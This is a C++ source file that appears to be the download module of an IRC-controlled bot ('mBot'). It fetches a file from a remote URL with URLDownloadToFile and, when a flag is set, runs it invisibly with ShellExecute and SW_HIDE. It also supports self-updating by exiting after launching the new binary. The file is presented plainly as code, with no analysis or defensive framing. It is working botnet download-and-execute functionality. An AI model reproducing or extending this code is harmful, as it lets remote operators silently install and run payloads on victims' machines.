#include "includes.h"
#include <urlmon.h>
#include "structure.h"
#include <windows.h>
#include "download.h"
#include "mBot.h"
#pragma comment(lib, "urlmon.lib")

extern download_t download_info;
extern IsUpd Is_Upd;
extern mBot *gMBot;



bool webSave(const std::string& url, const std::string& save)
{
    if (URLDownloadToFile(0,url.c_str(),save.c_str(),0,NULL) == S_OK) {
        return true;
    }
    else {
        return false;
    }
}

DWORD WINAPI dlThread (void *pVoid)
{
    bool ret = webSave((string)download_info.sURL, (string)download_info.sSave);
    return ret ? 1 : 0;
}

DWORD WINAPI dlFile (void *pVoid) {
	DWORD dwTid;
	HANDLE hThread = CreateThread(NULL,0,dlThread,NULL,0,&dwTid);
	if (!hThread)
	   {
		gMBot->mIrc->privmsg(channel,"couldn't create download thread.");
		return 0;
	}
	else
		WaitForSingleObject(hThread, INFINITE);
		DWORD dwExitCode;
		GetExitCodeThread(hThread, &dwExitCode);
	if (dwExitCode)
	{
		
		//gMBot->mIrc->privmsg(channel,"download of file " + download_info.sURL + " to " + download_info.sSave + " succeeded, took: " + lex<string>((double)(dlEvent.getStop()-dlEvent.getStart()) / 1000) + " seconds.");
		if (download_info.sExec == 1) { 
			ShellExecute(0,"open",download_info.sSave.c_str(),0,0,SW_HIDE);
			if (Is_Upd.x == TRUE) {
				exit(0); }
			download_info.sExec = 0;
		}
	}	
	else {
		//gMBot->mIrc->privmsg(channel,"failed to download " + download_info.sSave);
	}
	return 0;
}
